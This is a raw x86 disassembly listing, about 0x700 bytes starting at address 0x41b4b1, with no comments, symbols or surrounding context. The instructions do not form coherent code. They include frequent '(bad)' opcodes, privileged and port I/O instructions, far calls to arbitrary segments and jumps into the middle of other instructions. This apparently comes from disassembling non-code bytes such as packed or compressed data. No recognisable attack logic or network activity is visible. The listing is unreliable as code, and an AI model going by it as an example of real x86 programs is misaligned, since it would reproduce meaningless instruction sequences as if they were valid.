  41b4b1:	(bad)  
  41b4b2:	mov    esi,0x2a08
  41b4b7:	jae    0x41b43b
  41b4b9:	out    0x4d,eax
  41b4bb:	scas   eax,DWORD PTR es:[edi]
  41b4bc:	dec    esi
  41b4bd:	fisubr DWORD PTR [ecx+esi*4+0x41d3dc7]
  41b4c4:	inc    ecx
  41b4c5:	add    BYTE PTR [eax],al
  41b4c7:	stos   DWORD PTR es:[edi],eax
  41b4c8:	dec    ebp
  41b4c9:	call   0x248e:0x8ed2cd93
  41b4d0:	mov    bl,0x45
  41b4d2:	(bad)  
  41b4d4:	ds adc al,0x13
  41b4d7:	hlt    
  41b4d8:	and    ah,ch
  41b4da:	pop    esi
  41b4db:	push   eax
  41b4dc:	adc    DWORD PTR ds:0x94e7c7a2,edi
  41b4e2:	dec    ebp
  41b4e3:	pop    es
  41b4e4:	inc    edi
  41b4e5:	ins    DWORD PTR es:[edi],dx
  41b4e6:	repz popa 
  41b4e8:	pop    eax
  41b4e9:	sbb    al,0xf
  41b4eb:	mov    dh,0x13
  41b4ed:	pop    ebp
  41b4ee:	aaa    
  41b4ef:	pop    esi
  41b4f0:	pop    edx
  41b4f1:	mov    cl,BYTE PTR [edx]
  41b4f3:	sub    BYTE PTR [eax],0x0
  41b4f6:	add    BYTE PTR [esi-0x3f1d5d59],bl
  41b4fc:	test   DWORD PTR [eax],eax
  41b4fe:	add    bh,ah
  41b500:	jmp    0x41b4d2
  41b502:	mov    eax,0xd257414d
  41b507:	jbe    0x41b53e
  41b509:	mov    esi,0x71041b
  41b50e:	add    BYTE PTR [edi],bh
  41b510:	inc    edi
  41b511:	pop    ebx
  41b512:	dec    esp
  41b513:	jbe    0x41b515
  41b515:	add    BYTE PTR [ebp-0x8],bh
  41b518:	(bad)  
  41b519:	sub    al,0x5b
  41b51b:	inc    esp
  41b51c:	repnz add BYTE PTR [eax],al
  41b51f:	fadd   st(3),st
  41b521:	sub    eax,0x2060f05b
  41b526:	sbb    ebx,DWORD PTR [ebp-0x534b6e99]
  41b52c:	fstp   DWORD PTR [eax-0x630e70d0]
  41b532:	(bad)  
  41b534:	shr    BYTE PTR [ebx+0x4f],cl
  41b537:	popa   
  41b538:	or     BYTE PTR [ebx-0x5b],0xb2
  41b53c:	add    edi,DWORD PTR [eax+0xb19d4fd]
  41b542:	cs loope 0x41b51d
  41b545:	test   BYTE PTR [esi+0x2dd40000],cl
  41b54b:	xor    BYTE PTR [ebx+0x295fa8ff],bl
  41b551:	push   ds
  41b552:	pop    DWORD PTR [ecx-0xa]
  41b555:	ins    BYTE PTR es:[edi],dx
  41b556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b557:	aaa    
  41b558:	in     eax,dx
  41b559:	out    0xb2,al
  41b55b:	imul   ebp,DWORD PTR [edi-0x1d],0xbe246c61
  41b562:	jmp    0x41b4f0
  41b564:	hlt    
  41b565:	add    BYTE PTR [eax],al
  41b567:	push   cs
  41b568:	jo     0x41b59c
  41b56a:	adc    al,0xd8
  41b56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b56d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b56e:	test   al,0x14
  41b570:	stos   DWORD PTR es:[edi],eax
  41b571:	add    eax,0x2eee1258
  41b576:	ins    BYTE PTR es:[edi],dx
  41b577:	sbb    al,dh
  41b579:	loopne 0x41b515
  41b57b:	pop    edx
  41b57c:	push   ds
  41b57d:	fwait
  41b57e:	mov    edx,0x1348c311
  41b583:	add    BYTE PTR [eax],al
  41b585:	xchg   esi,eax
  41b586:	adc    BYTE PTR [esi],ah
  41b588:	cmp    DWORD PTR [eax+ecx*1+0x78],edi
  41b58c:	add    BYTE PTR [eax],al
  41b58e:	jmp    FWORD PTR [esi+0x57c67915]
  41b594:	add    dh,BYTE PTR [ecx]
  41b596:	xchg   ecx,eax
  41b597:	sahf   
  41b598:	xor    cl,cl
  41b59a:	inc    edx
  41b59b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b59c:	push   esi
  41b59d:	aad    0x27
  41b59f:	push   esp
  41b5a0:	fnstsw WORD PTR [edi+ebp*4]
  41b5a3:	lahf   
  41b5a4:	dec    ebx
  41b5a5:	pusha  
  41b5a6:	and    al,0xa0
  41b5a8:	push   cs
  41b5a9:	std    
  41b5aa:	sbb    BYTE PTR [edi-0x46],0x92
  41b5ae:	mov    esi,0x94504e72
  41b5b3:	jno    0x41b538
  41b5b5:	jmp    0x41b5c9
  41b5b7:	adc    edx,DWORD PTR [ebx]
  41b5b9:	scas   al,BYTE PTR es:[edi]
  41b5ba:	int3   
  41b5bb:	pushf  
  41b5bc:	add    BYTE PTR [eax],al
  41b5be:	outs   dx,BYTE PTR ds:[esi]
  41b5bf:	pop    eax
  41b5c0:	cmp    al,ch
  41b5c2:	adc    eax,ebx
  41b5c4:	adc    al,0xbb
  41b5c6:	(bad)  
  41b5c7:	clc    
  41b5c8:	stos   DWORD PTR es:[edi],eax
  41b5c9:	lods   al,BYTE PTR ds:[esi]
  41b5ca:	out    dx,eax
  41b5cb:	jb     0x41b640
  41b5cd:	jo     0x41b5d3
  41b5cf:	repnz add BYTE PTR [eax],al
  41b5d2:	mov    dl,0x17
  41b5d4:	(bad)  
  41b5d5:	retf   0x36de
  41b5d8:	shl    BYTE PTR [esi+0x6b],cl
  41b5db:	imul   esi,DWORD PTR [ecx],0xac4b606b
  41b5e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5e3:	arpl   WORD PTR [esi+0x68840291],bx
  41b5e9:	add    BYTE PTR [eax],al
  41b5eb:	lods   al,BYTE PTR ds:[esi]
  41b5ec:	aaa    
  41b5ed:	fwait
  41b5ee:	xchg   esp,eax
  41b5ef:	(bad)  
  41b5f0:	(bad)  
  41b5f1:	inc    ecx
  41b5f2:	hlt    
  41b5f3:	cmp    eax,0x1c302f9
  41b5f8:	mov    esi,0x8a3d90c1
  41b5fd:	xchg   ecx,eax
  41b5fe:	cmp    eax,0x4b88
  41b603:	div    esi
  41b605:	js     0x41b62c
  41b607:	fist   DWORD PTR [esi]
  41b609:	mov    al,0x2a
  41b60b:	(bad)  
  41b60c:	jmp    0xf65c8dc2
  41b611:	inc    esp
  41b612:	stos   DWORD PTR es:[edi],eax
  41b613:	add    BYTE PTR [eax],al
  41b615:	adc    al,0x90
  41b618:	push   edx
  41b619:	hlt    
  41b61a:	int3   
  41b61b:	pop    ds
  41b61c:	add    BYTE PTR [eax],al
  41b61e:	xchg   BYTE PTR ds:0x55d29875,al
  41b624:	mov    DWORD PTR [bp+si],ebx
  41b627:	mov    eax,ds:0xbd33ed8a
  41b62c:	jb     0x41b5da
  41b62e:	xchg   BYTE PTR [eax-0x6fffffb1],cl
  41b634:	jmp    0x41b658
  41b636:	mov    edx,0x47587820
  41b63b:	cmp    al,0x2b
  41b63d:	add    BYTE PTR [ecx-0x264f0000],bh
  41b643:	rcl    edi,cl
  41b645:	fcmove st,st(1)
  41b647:	xchg   edx,eax
  41b648:	out    dx,eax
  41b649:	cmp    DWORD PTR [ecx],esp
  41b64b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b64c:	push   ss
  41b64d:	dec    eax
  41b64e:	loop   0x41b650
  41b650:	add    bl,al
  41b652:	mov    edi,DWORD PTR [eax]
  41b654:	xor    esp,ebx
  41b656:	sbb    BYTE PTR [edx],ah
  41b658:	scas   eax,DWORD PTR es:[edi]
  41b659:	sbb    edx,edx
  41b65b:	into   
  41b65c:	push   ebx
  41b65d:	ret    0x8965
  41b660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b661:	dec    edx
  41b662:	stc    
  41b663:	xchg   DWORD PTR [ebp-0x6],esp
  41b666:	mov    bh,0xc9
  41b668:	cmp    BYTE PTR [ebp+0x35],0xe6
  41b66c:	jmp    0x4624:0xcd393898
  41b673:	push   0x44
  41b675:	inc    eax
  41b676:	add    BYTE PTR [eax],al
  41b678:	call   0x2a7a3340
  41b67d:	push   ss
  41b67e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b67f:	aaa    
  41b680:	jmp    0x60b6c54f
  41b685:	xchg   BYTE PTR [eax+0xb1c8],dl
  41b68b:	js     0x41b6d6
  41b68d:	xchg   DWORD PTR [ebp-0xa085472],esp
  41b693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b694:	xor    DWORD PTR [ebx+0xf],0x829a8a8a
  41b69b:	pop    edx
  41b69c:	pop    edi
  41b69d:	lds    edx,FWORD PTR [eax+0x14]
  41b6a0:	add    BYTE PTR [edi],0x0
  41b6a3:	add    BYTE PTR [edx-0x76],bh
  41b6a6:	ja     0x41b67e
  41b6a8:	sub    DWORD PTR [ecx-0x5ef6221b],eax
  41b6ae:	sbb    eax,DWORD PTR [eax+0x34]
  41b6b1:	add    BYTE PTR [eax],al
  41b6b3:	aam    0x2d
  41b6b5:	dec    esi
  41b6b6:	fsub   QWORD PTR [edx-0x15f28aaa]
  41b6bc:	ror    DWORD PTR [ecx+0x12603ed0],cl
  41b6c2:	stos   BYTE PTR es:[edi],al
  41b6c3:	ret    
  41b6c4:	xor    esi,edx
  41b6c6:	mov    cl,0xc2
  41b6c8:	jecxz  0x41b6fc
  41b6ca:	popa   
  41b6cb:	aas    
  41b6cc:	(bad)  
  41b6cd:	xchg   BYTE PTR [ecx-0x7e],dh
  41b6d0:	push   esi
  41b6d1:	cs (bad) 
  41b6d3:	lods   al,BYTE PTR ds:[esi]
  41b6d4:	mov    ds:0xce879496,al
  41b6d9:	out    0xe1,eax
  41b6db:	push   edi
  41b6dc:	mov    ds:0xcc3868ae,al
  41b6e1:	or     al,BYTE PTR [eax]
  41b6e3:	add    BYTE PTR [ebx+0x30520239],ch
  41b6e9:	mov    ch,0x8b
  41b6eb:	xchg   ecx,esi
  41b6ed:	ins    BYTE PTR es:[edi],dx
  41b6ee:	call   0x5a0aa382
  41b6f3:	add    BYTE PTR [eax],al
  41b6f5:	dec    ebx
  41b6f6:	jg     0x41b750
  41b6f8:	jg     0x41b76a
  41b6fa:	stos   BYTE PTR es:[edi],al
  41b6fb:	cs fs mov al,0x80
  41b6ff:	lock add BYTE PTR [eax],al
  41b702:	and    al,0x4b
  41b704:	test   al,0x93
  41b706:	inc    DWORD PTR [ebx]
  41b708:	cmp    eax,0xe41826d2
  41b70d:	scas   al,BYTE PTR es:[edi]
  41b70e:	inc    eax
  41b70f:	push   ebp
  41b710:	add    BYTE PTR [eax],al
  41b712:	repnz and dl,BYTE PTR ds:0x7d7cf7c6
  41b719:	sbb    al,0x1d
  41b71b:	ds in  al,dx
  41b71d:	xor    BYTE PTR [ecx],ch
  41b71f:	mul    BYTE PTR [esi]
  41b721:	js     0x41b713
  41b723:	lds    edi,FWORD PTR [edi+0x3bc0b5]
  41b729:	add    BYTE PTR [ecx],bl
  41b72b:	jno    0x41b6e0
  41b72d:	xor    esp,DWORD PTR [esi-0x30dbf13e]
  41b733:	out    0xe3,al
  41b735:	cmp    ch,0x0
  41b738:	add    BYTE PTR [ebp-0x37],al
  41b73b:	retf   0x5e80
  41b73e:	add    BYTE PTR [eax],al
  41b740:	mov    DWORD PTR [eax+0xdfc413],ebx
  41b746:	add    bh,dh
  41b748:	and    bl,BYTE PTR [edi+0x72]
  41b74b:	mov    ds:0x12524dd2,eax
  41b750:	sub    al,0xf
  41b752:	or     BYTE PTR [esi-0x38],0xf8
  41b756:	add    BYTE PTR [eax],al
  41b758:	pushf  
  41b759:	icebp  
  41b75a:	fstp   QWORD PTR [eax*4-0x2ffe1b79]
  41b761:	addr16 jno 0x41b74f
  41b764:	fs xor eax,0xd4702a5f
  41b76a:	retf   
  41b76b:	push   cs
  41b76c:	ret    
  41b76d:	add    DWORD PTR [esi-0x58c4dea4],esp
  41b773:	std    
  41b774:	loop   0x41b70f
  41b776:	push   esp
  41b777:	cwde   
  41b778:	popf   
  41b779:	out    dx,eax
  41b77a:	adc    eax,0x76aa43d4
  41b77f:	lds    ecx,FWORD PTR [esi+0x36]
  41b782:	sbb    al,0xfd
  41b784:	push   0x177701d0
  41b789:	call   0xe8fc:0x91b84f9c
  41b790:	fucomp st(4)
  41b792:	adc    BYTE PTR [esi-0x5c53f682],cl
  41b798:	inc    edi
  41b799:	cli    
  41b79a:	pop    edx
  41b79b:	icebp  
  41b79c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b79d:	stc    
  41b79e:	out    dx,al
  41b79f:	hlt    
  41b7a0:	nop
  41b7a1:	jno    0x41b81c
  41b7a3:	mov    ebp,0x1ab07a0e
  41b7a8:	fisub  DWORD PTR [edx+0x66225a36]
  41b7ae:	in     eax,dx
  41b7af:	and    edi,DWORD PTR [ebp-0x22]
  41b7b2:	leave  
  41b7b3:	mov    ah,0x19
  41b7b5:	dec    ebp
  41b7b6:	pop    eax
  41b7b7:	mul    DWORD PTR [ecx-0x75]
  41b7ba:	xchg   edx,eax
  41b7bb:	add    BYTE PTR [edx+0x6b9f0000],cl
  41b7c1:	xchg   bl,dl
  41b7c3:	xchg   ebp,eax
  41b7c4:	mov    bh,0xd7
  41b7c6:	ins    BYTE PTR es:[edi],dx
  41b7c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7c8:	mov    cl,0x97
  41b7ca:	scas   eax,DWORD PTR es:[edi]
  41b7cb:	push   esp
  41b7cc:	into   
  41b7cd:	aas    
  41b7ce:	push   es
  41b7cf:	sbb    edi,0x5520266d
  41b7d5:	clc    
  41b7d6:	fld    TBYTE PTR [edi]
  41b7d8:	inc    DWORD PTR [edi+eiz*2+0x7e9f0000]
  41b7df:	add    ch,0x0
  41b7e2:	add    al,bh
  41b7e4:	push   esi
  41b7e5:	std    
  41b7e6:	test   BYTE PTR [ecx+0x0],ch
  41b7e9:	add    ch,dh
  41b7eb:	adc    esi,esp
  41b7ed:	outs   dx,BYTE PTR ds:[esi]
  41b7ee:	fistp  WORD PTR [ebx+0x4d734eeb]
  41b7f4:	mov    esp,0xcfe45a83
  41b7f9:	into   
  41b7fa:	pushf  
  41b7fb:	inc    ecx
  41b7fc:	shr    DWORD PTR [eax+edi*1],cl
  41b7ff:	dec    ecx
  41b800:	ss fs pop esi
  41b803:	cmp    BYTE PTR [ebx-0x472d423b],dl
  41b809:	add    bl,ah
  41b80b:	lea    eax,gs:[edi+ebp*4]
  41b80f:	add    BYTE PTR [eax],al
  41b811:	fidivr DWORD PTR [edi+eiz*1-0x23588256]
  41b818:	imul   ebp,DWORD PTR [ebx+esi*2+0xc],0xffffff8a
  41b81d:	add    BYTE PTR [eax],al
  41b81f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b820:	jmp    0x49c5:0x26f5a356
  41b827:	mov    dh,0x4a
  41b829:	(bad)  
  41b82a:	test   DWORD PTR [eax],0xeb1fef00
  41b830:	retf   
  41b831:	sub    al,0xb1
  41b833:	sub    eax,0x924c78c1
  41b838:	add    BYTE PTR [eax],al
  41b83a:	jmp    0x41b885
  41b83c:	popf   
  41b83d:	jecxz  0x41b8a6
  41b83f:	icebp  
  41b840:	pop    ds
  41b841:	and    eax,0x6adcd1a
  41b846:	xchg   edi,eax
  41b847:	pop    edi
  41b848:	xchg   esi,eax
  41b849:	push   edx
  41b84a:	cwde   
  41b84b:	addr16 sti 
  41b84d:	bound  esp,QWORD PTR [ecx-0x57]
  41b850:	in     al,dx
  41b851:	xor    bh,BYTE PTR [ecx+0x6b8ad42c]
  41b857:	sbb    ch,al
  41b859:	mov    esi,0x3113e5d8
  41b85e:	shl    DWORD PTR [edx-0x73d8866a],1
  41b864:	stos   DWORD PTR es:[edi],eax
  41b865:	add    BYTE PTR [eax],al
  41b867:	mov    ecx,0xedd1e78
  41b86c:	call   0x6d97fb04
  41b871:	and    eax,0x95929cbe
  41b876:	sub    BYTE PTR [edx],0x0
  41b879:	add    cl,ah
  41b87b:	inc    eax
  41b87c:	push   esi
  41b87d:	add    BYTE PTR [eax],al
  41b87f:	pop    edx
  41b880:	ins    BYTE PTR es:[edi],dx
  41b881:	test   eax,ecx
  41b883:	je     0x41b885
  41b885:	add    BYTE PTR [ebx],ch
  41b887:	adc    DWORD PTR [ecx],edi
  41b889:	mov    eax,ds:0xd028e6aa
  41b88e:	or     ecx,ebx
  41b890:	push   ecx
  41b891:	shr    DWORD PTR [edx],0x36
  41b894:	mov    bl,0x8
  41b896:	pop    edx
  41b897:	add    BYTE PTR [eax],al
  41b899:	push   edi
  41b89a:	enter  0x4b,0x0
  41b89e:	cdq    
  41b89f:	push   ss
  41b8a0:	add    cl,bl
  41b8a2:	add    BYTE PTR [eax],al
  41b8a4:	jle    0x41b8ac
  41b8a6:	mov    esi,0x6404b4e3
  41b8ab:	add    BYTE PTR [eax],al
  41b8ad:	dec    edi
  41b8ae:	scas   eax,DWORD PTR es:[edi]
  41b8af:	pop    edx
  41b8b0:	jmp    DWORD PTR [esi+0x50]
  41b8b3:	dec    edi
  41b8b4:	adc    edx,DWORD PTR [ecx]
  41b8b6:	stos   DWORD PTR es:[edi],eax
  41b8b7:	shl    BYTE PTR [edi-0x2f95bcca],1
  41b8bd:	cmc    
  41b8be:	(bad)  
  41b8bf:	mov    bh,0xf3
  41b8c1:	pop    es
  41b8c2:	xchg   esi,eax
  41b8c3:	inc    ebp
  41b8c4:	dec    edx
  41b8c5:	scas   al,BYTE PTR es:[edi]
  41b8c6:	jg     0x41b8d2
  41b8c8:	push   cs
  41b8c9:	sar    BYTE PTR [esi+0x0],0x0
  41b8cd:	jns    0x41b943
  41b8cf:	ins    BYTE PTR es:[edi],dx
  41b8d0:	pop    ebx
  41b8d1:	fnsave [ebx]
  41b8d3:	xchg   edx,eax
  41b8d4:	mov    ds:0x8b08,al
  41b8d9:	and    DWORD PTR [ebx],ecx
  41b8db:	aaa    
  41b8dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8dd:	cmp    al,dl
  41b8df:	xor    DWORD PTR ds:0x8d8a932f,0x7659f7ed
  41b8e9:	cmp    BYTE PTR [ebx-0x6a],ah
  41b8ec:	je     0x41b8cd
  41b8ee:	fadd   DWORD PTR [ebp-0x610a9f91]
  41b8f4:	nop
  41b8f5:	jo     0x41b931
  41b8f7:	inc    esi
  41b8f8:	(bad)  
  41b8f9:	stos   DWORD PTR es:[edi],eax
  41b8fa:	ins    BYTE PTR es:[edi],dx
  41b8fb:	rcr    BYTE PTR [edi],1
  41b8fd:	out    0x89,eax
  41b8ff:	sbb    BYTE PTR [ecx+0x44],cl
  41b902:	add    BYTE PTR [eax],al
  41b904:	add    BYTE PTR [ebp-0x1f7ad197],ch
  41b90a:	dec    ebx
  41b90b:	je     0x41b983
  41b90d:	test   al,0xd0
  41b90f:	mov    ebx,0xb6cd5347
  41b914:	gs sbb eax,esp
  41b917:	(bad)  
  41b918:	dec    eax
  41b919:	stos   BYTE PTR es:[edi],al
  41b91a:	add    BYTE PTR [eax],al
  41b91c:	push   edi
  41b91d:	push   ds
  41b91e:	sbb    eax,0x4ac0
  41b923:	std    
  41b924:	out    dx,al
  41b925:	div    dl
  41b927:	fisttp DWORD PTR ds:0xdf4b56ee
  41b92d:	xchg   ebp,eax
  41b92e:	mov    dh,ch
  41b930:	cdq    
  41b931:	jmp    0x41b8c6
  41b933:	and    eax,0x65c4f87
  41b938:	out    dx,eax
  41b939:	and    BYTE PTR [edx+0x0],0x0
  41b93d:	adc    DWORD PTR [ebx+0xc],eax
  41b940:	jns    0x41b942
  41b942:	add    bh,bl
  41b944:	call   0xbb4f06d4
  41b949:	pusha  
  41b94a:	out    0xed,al
  41b94c:	mov    esp,0x12b06ecd
  41b951:	fild   QWORD PTR [esi+0x1237e024]
  41b957:	popa   
  41b958:	sbb    BYTE PTR ss:[ebp+0x0],0x0
  41b95d:	call   0xf48e:0xfa33563
  41b964:	js     0x41b9d2
  41b966:	stc    
  41b967:	sub    eax,0xd90de463
  41b96c:	xchg   ebx,eax
  41b96d:	mov    edx,0xae3fb96a
  41b972:	xchg   ecx,eax
  41b973:	arpl   WORD PTR [edx],bx
  41b975:	push   edi
  41b976:	sbb    BYTE PTR [edx+0x3c],bh
  41b979:	outs   dx,DWORD PTR ds:[esi]
  41b97a:	shl    DWORD PTR [ecx-0xb],cl
  41b97d:	pusha  
  41b97e:	aad    0x7e
  41b980:	addr16 dec ebx
  41b982:	jae    0x41b933
  41b984:	or     BYTE PTR [eax+eax*1],dh
  41b987:	add    BYTE PTR [eax],ch
  41b989:	add    eax,0x5f2911d1
  41b98e:	pop    edi
  41b98f:	pop    ecx
  41b990:	adc    edi,DWORD PTR [edx+0x18]
  41b993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b994:	or     ah,BYTE PTR ds:0xfdcf1d82
  41b99a:	(bad)  
  41b99b:	mov    eax,ds:0x5275a80e
  41b9a0:	push   esi
  41b9a1:	mov    al,BYTE PTR [ebp+ebx*4+0x2a4d0000]
  41b9a8:	inc    esi
  41b9a9:	sbb    ch,BYTE PTR [eax-0x632dbeb6]
  41b9af:	pop    ds
  41b9b0:	(bad)  
  41b9b1:	jo     0x41b9cf
  41b9b3:	stos   DWORD PTR es:[edi],eax
  41b9b4:	test   DWORD PTR [edx-0x71],edx
  41b9b7:	cwde   
  41b9b8:	data16 (bad) 
  41b9ba:	push   0x10006438
  41b9bf:	add    BYTE PTR [eax],al
  41b9c1:	jge    0x41ba3d
  41b9c3:	icebp  
  41b9c4:	ret    0x355c
  41b9c7:	mov    bl,0x78
  41b9c9:	loopne 0x41ba17
  41b9cb:	jge    0x41b9cd
  41b9cd:	add    al,bh
  41b9cf:	test   DWORD PTR [ecx+eax*1],ebx
  41b9d2:	dec    ebp
  41b9d3:	adc    BYTE PTR [eax+0x7a],bl
  41b9d6:	(bad)  
  41b9d9:	adc    BYTE PTR [edx+0x5331c719],ch
  41b9df:	pop    DWORD PTR [ecx+0x1dfd29a4]
  41b9e5:	mov    bl,0xcf
  41b9e7:	retf   
  41b9e8:	push   cs
  41b9e9:	and    ecx,DWORD PTR [edx+0x2f]
  41b9ec:	call   0x7f75:0x18e05bdb
  41b9f3:	out    0x71,al
  41b9f5:	pop    ds
  41b9f6:	mov    bl,0x84
  41b9f8:	sti    
  41b9f9:	add    BYTE PTR [eax],al
  41b9fb:	(bad)  
  41b9fd:	push   eax
  41b9fe:	jno    0x41ba17
  41ba00:	add    al,0x18
  41ba02:	add    BYTE PTR [eax],al
  41ba04:	out    dx,eax
  41ba05:	inc    esp
  41ba06:	fadd   QWORD PTR [eax]
  41ba08:	add    BYTE PTR [edi+0xf14b155],al
  41ba0e:	push   cs
  41ba0f:	mov    dh,0x1a
  41ba11:	cmp    eax,0x7b6697ea
  41ba16:	frstor [edx+edi*4+0x9]
  41ba1a:	pop    edi
  41ba1b:	push   edi
  41ba1c:	jl     0x41ba1e
  41ba1e:	push   ecx
  41ba1f:	add    BYTE PTR [eax],al
  41ba21:	adc    ch,al
  41ba23:	xchg   dh,al
  41ba25:	and    bl,BYTE PTR [edi-0x70d35a4]
  41ba2b:	ficomp DWORD PTR [ebp+0x9]
  41ba2e:	das    
  41ba2f:	test   al,0xe5
  41ba31:	add    eax,0xf5c86472
  41ba36:	add    BYTE PTR [eax],al
  41ba38:	(bad)  
  41ba39:	aaa    
  41ba3a:	push   esp
  41ba3b:	mov    al,0x41
  41ba3d:	repnz loopne 0x41ba00
  41ba40:	mov    edx,0xc36b0000
  41ba45:	daa    
  41ba46:	adc    bh,BYTE PTR [eax]
  41ba48:	dec    esp
  41ba49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba4a:	add    BYTE PTR [eax],al
  41ba4c:	jmp    0x2426cc6
  41ba51:	add    BYTE PTR [eax],al
  41ba53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba54:	shr    BYTE PTR [esi],1
  41ba56:	inc    ebx
  41ba57:	adc    BYTE PTR [ebp+0x48],ch
  41ba5a:	sahf   
  41ba5b:	add    BYTE PTR [eax],al
  41ba5d:	and    edi,DWORD PTR [edx+ecx*4-0x26]
  41ba61:	or     bh,BYTE PTR [ebx+0x48d7daa8]
  41ba67:	mov    dh,0x0
  41ba69:	add    ch,dl
  41ba6b:	fadd   QWORD PTR [edi-0x54ebe5cb]
  41ba71:	aam    0x3c
  41ba73:	sub    BYTE PTR [eax],ch
  41ba75:	inc    ebp
  41ba76:	xor    esp,DWORD PTR [edi]
  41ba78:	adc    eax,0x38b378f7
  41ba7d:	repz rcr BYTE PTR [ebp+0x408b0000],0x78
  41ba85:	add    BYTE PTR [eax],al
  41ba87:	retf   
  41ba88:	push   eax
  41ba89:	mov    esi,0x5d44b8
  41ba8e:	add    BYTE PTR [ebx+ecx*4],bh
  41ba91:	jnp    0x41ba80
  41ba93:	lea    esp,[ebx+0x6]
  41ba96:	mov    esp,0xc593abd4
  41ba9b:	fdivr  QWORD PTR [esi]
  41ba9d:	dec    edi
  41ba9e:	xchg   edx,eax
  41ba9f:	inc    edi
  41baa0:	dec    esi
  41baa1:	xchg   ebp,eax
  41baa2:	mov    eax,ds:0xffc0
  41baa7:	or     dl,BYTE PTR [edx+edi*1]
  41baaa:	fwait
  41baab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baac:	jno    0x41ba9b
  41baae:	xchg   edi,eax
  41baaf:	loop   0x41ba8d
  41bab1:	adc    DWORD PTR [edi+0xdefffa3],0xffffff82
  41bab8:	sbb    esp,ebp
  41baba:	in     al,dx
  41babb:	jmp    0x41bab6
  41babd:	and    bl,ch
  41babf:	sar    BYTE PTR [eax],0x0
  41bac2:	add    BYTE PTR [ecx+ecx*2-0x4821cc23],bl
  41bac9:	pushf  
  41baca:	xchg   ebp,eax
  41bacb:	jp     0x41ba59
  41bacd:	je     0x41bacf
  41bacf:	add    BYTE PTR [ebx+ebp*4],ch
  41bad2:	xchg   esi,eax
  41bad3:	mov    eax,ds:0xf557376
  41bad8:	mov    ah,0xbb
  41bada:	sbb    esp,edi
  41badc:	mov    al,0x99
  41badf:	add    BYTE PTR [eax],al
  41bae1:	dec    eax
  41bae2:	or     al,0x0
  41bae4:	add    BYTE PTR [edi-0x51cad501],dh
  41baea:	enter  0x6a,0x0
  41baee:	xchg   edi,eax
  41baef:	repnz lds esp,FWORD PTR fs:0x37affa0b
  41baf7:	repnz pop DWORD PTR [edx-0x6175b0f]
  41bafe:	cmp    al,0xd3
  41bb00:	call   esi
  41bb02:	xchg   esp,eax
  41bb03:	dec    edx
  41bb04:	dec    edi
  41bb05:	jns    0x41badd
  41bb07:	push   eax
  41bb08:	push   esp
  41bb09:	aad    0x54
  41bb0b:	inc    edi
  41bb0c:	jno    0x41baff
  41bb0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb0f:	push   ds
  41bb10:	mov    dl,0x7a
  41bb12:	in     eax,0x8d
  41bb14:	mov    al,0x8f
  41bb16:	dec    ebx
  41bb17:	cmc    
  41bb18:	aad    0x3d
  41bb1a:	fst    QWORD PTR [ebx]
  41bb1c:	scas   al,BYTE PTR es:[edi]
  41bb1d:	pop    esi
  41bb1e:	xor    DWORD PTR [ebp-0x29],esp
  41bb21:	sbb    ebx,DWORD PTR [ebx-0x74e414]
  41bb27:	lahf   
  41bb28:	mov    bh,ch
  41bb2a:	add    BYTE PTR [eax],al
  41bb2c:	xchg   ebx,eax
  41bb2d:	inc    edi
  41bb2e:	aam    0xba
  41bb30:	iret   
  41bb31:	sbb    al,0xfe
  41bb33:	xchg   esp,eax
  41bb34:	or     dh,ah
  41bb36:	enter  0xfb,0x0
  41bb3a:	sub    DWORD PTR [esi-0x34],esp
  41bb3d:	int    0x0
  41bb3f:	add    BYTE PTR [edx+edx*2],dh
  41bb42:	lods   eax,DWORD PTR ds:[esi]
  41bb43:	scas   al,BYTE PTR es:[edi]
  41bb44:	ret    0x417a
  41bb47:	pop    ss
  41bb48:	cmp    DWORD PTR [eax-0x4afffff4],ecx
  41bb4e:	push   ds
  41bb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb50:	jnp    0x41bb5c
  41bb52:	or     al,0xb1
  41bb54:	add    BYTE PTR [eax],al
  41bb56:	loope  0x41bb1c
  41bb58:	add    eax,0x2d220000
  41bb5d:	in     al,dx
  41bb5e:	retf   0x9ee8
  41bb61:	fld    QWORD PTR [esp+ebp*8+0x0]
  41bb65:	add    BYTE PTR [ecx+0x676c630a],dl
  41bb6b:	xchg   edx,eax
  41bb6c:	aas    
  41bb6d:	arpl   WORD PTR [esi],di
  41bb6f:	push   0xffffff83
  41bb71:	and    eax,0x96c77589
  41bb76:	(bad)  [ebx]
  41bb78:	lahf   
  41bb79:	xchg   edi,eax
  41bb7a:	mov    eax,0xab84f19
  41bb7f:	enter  0x86,0x0
  41bb83:	or     bh,cl
  41bb85:	shl    BYTE PTR [edi+0x3448],1
  41bb8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb8c:	hlt    
  41bb8d:	(bad)  
  41bb8e:	fdiv   st(6),st
  41bb90:	mul    edx
  41bb92:	in     eax,dx
  41bb93:	icebp  
  41bb94:	adc    bl,0x0
  41bb97:	add    BYTE PTR [ebp-0x40],ch
  41bb9a:	dec    eax
  41bb9b:	add    BYTE PTR [eax],al
  41bb9d:	push   es
  41bb9e:	ds mov bh,0x4e
  41bba1:	(bad)  [eax+0xc04077]
  41bba7:	add    al,dh
  41bba9:	loop   0x41bb3a
  41bbab:	ja     0x41bb8f
  41bbad:	outs   dx,DWORD PTR ds:[esi]
